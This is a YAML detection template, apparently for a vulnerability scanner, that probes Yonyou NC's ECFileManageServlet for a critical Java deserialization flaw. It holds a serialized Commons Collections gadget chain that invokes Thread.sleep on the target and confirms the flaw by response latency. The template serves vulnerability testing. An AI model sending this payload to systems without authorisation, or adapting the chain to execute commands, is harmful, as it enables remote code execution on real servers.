name: yaml-poc-yonyou-yonyou_nc-deserialization-CT-737582
binding: c01549a5-4380-4dcd-a7f7-a42bbcf3abaa
detail:
    author: lianjian.chen
    links:
        - https://security.yonyou.com/#/noticeInfo?id=315
    vulnerability:
        id: aa7ac1a9-61b6-4862-b068-a96769c65a94
        level: critical
    warning: Harmless
transport: http
set:
    rb: b"\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\f\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpt\x00\x04su18sr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\afactoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.ChainedTransformer0\xc7\x97\xec(z\x97\x04\x02\x00\x01[\x00\riTransformerst\x00-[Lorg/apache/commons/collections/Transformer;xpur\x00-[Lorg.apache.commons.collections.Transformer;\xbdV*\xf1\xd84\x18\x99\x02\x00\x00xp\x00\x00\x00\x04sr\x00;org.apache.commons.collections.functors.ConstantTransformerXv\x90\x11A\x02\xb1\x94\x02\x00\x01L\x00\tiConstantq\x00~\x00\x03xpvr\x00\x10java.lang.Thread\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\viMethodNamet\x00\x12Ljava/lang/String;[\x00\viParamTypest\x00\x12[Ljava/lang/Class;xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x02t\x00\rcurrentThreadpt\x00\tgetMethodur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x02vr\x00\x10java.lang.String\xa0\xf0\xa48z;\xb3B\x02\x00\x00xpvq\x00~\x00\x1csq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x02ppt\x00\x06invokeuq\x00~\x00\x1c\x00\x00\x00\x02vr\x00\x10java.lang.Object\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpvq\x00~\x00\x18sq\x00~\x00\x13uq\x00~\x00\x18\x00\x00\x00\x01sr\x00\x0ejava.lang.Long;\x8b\xe4\x90\xcc\x8f#\xdf\x02\x00\x01J\x00\x05valuexr\x00\x10java.lang.Number\x86\xac\x95\x1d\v\x94\xe0\x8b\x02\x00\x00xp\x00\x00\x00\x00\x00\x00'\x10t\x00\x05sleepuq\x00~\x00\x1c\x00\x00\x00\x01vr\x00\x04long\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpsr\x00\x11java.util.HashMap\x05\a\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x00w\b\x00\x00\x00\x10\x00\x00\x00\x00xxx"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /servlet/~ecapppub/nc.impl.ecpubapp.filemanager.service.ECFileManageServlet
            follow_redirects: false
        expression: response.status == 405 && response.body_string.contains("UAP Server")
    r1:
        request:
            cache: true
            method: POST
            path: /servlet/~ecapppub/nc.impl.ecpubapp.filemanager.service.ECFileManageServlet
            headers:
                Content-Type: multipart/form-data;
            body: '{{rb}}'
            follow_redirects: false
        expression: response.latency >= 10000 && response.latency <= 15000
expression: r0() && r1()
